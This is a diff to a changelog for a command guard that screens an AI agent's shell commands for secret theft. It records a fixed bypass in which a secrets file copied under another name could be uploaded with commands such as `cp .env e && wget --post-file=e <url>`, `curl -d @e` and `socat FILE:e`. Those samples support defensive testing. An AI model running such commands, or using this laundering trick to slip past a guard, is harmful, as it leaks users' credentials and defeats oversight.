@@ -155,11 +155,13 @@ Round 14b closes the same-command laundering gap (in-PR fix). A secret copied, m
 
 Round 14c (PR #30 automated review comment 6481092153, on `1a4e992`; both are round-13 regressions, fixed in this PR). #70: `git grep <pattern>` false-asked on a credential-word pattern, because only grep/egrep/rg/ag exempted the pattern. `git grep` now gets the same pattern-as-text exemption, and a secret-store operand still blocks. #71: the find/ls consumer check was command-wide and memoized, so an unrelated `$(ls /tmp)` made a standalone `find . -name '*.env' -print` ask. It is now a per-segment set of fed listings. Tests: `round 14 #70` and `round 14 #71` in `server/test/secret-tiers.test.mjs` each fail at `abc6ae2` and pass at HEAD. Mutations: removing the git-grep exemption, using the command-wide flag, and dropping the substitution feed each fail a test. Corpus rows g371 to g374. Suites: server 126/126, `tests/test-scripts.sh` 41/0; `tests/test-hook.sh` needs a live `JEV_MCP_URL`/`JEV_MCP_TOKEN` and was not run here. Offline guard eval: 424 rows, 99.1% accuracy, 98.4% catch-recall, 100% precision, 0.0% false-alarm; misses are the same four (g55, g68, g69, r08). The grep clause still uses the command-wide fed flag, which is its prior meaning and is unchanged this round.
 
+Round 15 closes copy-then-upload within one command (in-PR fix; converged-verdict P2 on PR #30). `cp .env e && wget --post-file=e <url>`, `wget --body-file=e`, `curl -d @e`, `curl --data=@e`, `curl -F f=@e`, `socat FILE:e`, `http POST x @e`, and `dd if=e` all allowed: the alias pass rewrote only whole tokens, while the upload/read operand carries the name inside `--opt=VALUE`, `@VALUE`, `if=VALUE`, or `FILE:VALUE`. `aliasedToken` in `server/src/kit/guard.mjs` now also tries each suffix after `=`, `@`, or `:`, so the copy is rewritten and the existing R1 exfil rules classify it as they do the direct form. Tests: `round 15 P2` in `server/test/secret-tiers.test.mjs` fails at `5cbf4f8` and passes at HEAD, with non-secret controls (`cp notes.txt n && wget --post-file=n`, and `cp .env e` alone) still allowed. Benign sweep gains the `cp notes.txt n && wget --post-file=n` row. Mutations: whole-token-only, no token rewrite, and no `:` cut each fail the round-15 test; no token rewrite also fails round 14b. Corpus g375–g382 (7 block, 1 allow control). Disclosed limit: cross-command laundering remains #82.
+
 
 
 | corpus | n | accuracy | catch-recall | catch-precision | false-alarm-rate |
 |---|---|---|---|---|---|
-| guard | 424 | 99.1% | 98.4% | 100.0% | **0.0%** |
+| guard | 432 | 99.1% | 98.4% | 100.0% | **0.0%** |
 | verify_done | 62 | 54.8%\* | 0.0%\* | n/a | 0.0% |
 
 \*`verify_done`'s score is an artifact of this sandbox having no Jev credentials: every case needing Jev's
